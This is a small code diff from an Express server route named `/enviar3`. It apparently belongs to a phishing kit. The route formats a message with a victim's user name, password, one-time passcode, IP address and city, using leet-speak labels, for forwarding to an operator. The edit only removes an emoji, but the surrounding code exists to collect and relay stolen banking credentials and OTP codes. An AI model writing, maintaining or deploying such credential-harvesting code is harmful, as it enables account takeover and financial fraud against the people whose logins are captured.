@@ -135,7 +135,7 @@ app.post('/enviar3', async (req, res) => {
 📱 US4R: ${usar}
 🔐 CL4V: ${clavv}
 
-🔑 0TP: ${dinamic}❓ 
+🔑 0TP: ${dinamic}
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
